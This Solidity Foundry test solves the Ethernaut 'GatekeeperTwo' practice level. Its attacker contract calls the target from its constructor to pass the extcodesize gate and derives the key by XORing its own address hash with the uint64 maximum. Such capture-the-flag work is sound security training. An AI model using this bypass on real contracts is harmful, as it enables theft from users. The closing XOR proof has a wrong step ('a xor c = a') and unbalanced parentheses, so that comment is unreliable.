// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {GatekeeperTwoFactory} from "../src/factories/GatekeeperTwoFactory.sol";
import {GatekeeperTwo} from "../src/levels/GatekeeperTwo.sol";

import "forge-std/console.sol";

contract GatekeeperTwoTest is EthernautTest {
    GatekeeperTwoFactory public factory;

    function setUp() public override {
        super.setUp();
        factory = new GatekeeperTwoFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveGatekeeperTwo() public {
        // GatekeeperTwo keeper = GatekeeperTwo(payable(levelAddress));

        // [START]

        // 1. Deploy attacker contract & call _enter
        new GatekeeperTwoAttack(payable(levelAddress));

        // [END]

        assert(factory.validateInstance(payable(levelAddress), tx.origin));
    }
}

// Attacker contract
contract GatekeeperTwoAttack {
    GatekeeperTwo public target;

    constructor(address _target) {
        target = GatekeeperTwo(_target);

        // uint256 x;
        // assembly {
        //     x := extcodesize(caller())
        // }
        // require(x == 0);

        _enter();
    }

    function _enter() private {
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
        // => uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max == uint64(_gateKey)

        uint64 u64 = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
            type(uint64).max;

        bytes8 key = bytes8(u64);

        target.enter(key);
    }
}
/*
Given:

a xor b = c

To Proof:

a xor c = b and
b xor c = a

Solution:

we have,

a xor b = c

taking  xor with 'a' both side
⇒  a xor(a xor b) = a xor c
⇒  (a xor a)* xor b) = a xor c
⇒  0 xor b = a xor c               (as, a xor a = 0)
⇒  a xor c = b

Again,

a xor b = c

taking  xor with 'b' both side
⇒  b xor(a xor b) = b xor c
⇒  (b xor a)* xor b) = b xor c
⇒  0 xor a = a xor c               (as, b xor b = 0)
⇒  a xor c = a

So, a xor c = b and b xor c = a  Proved.

 */
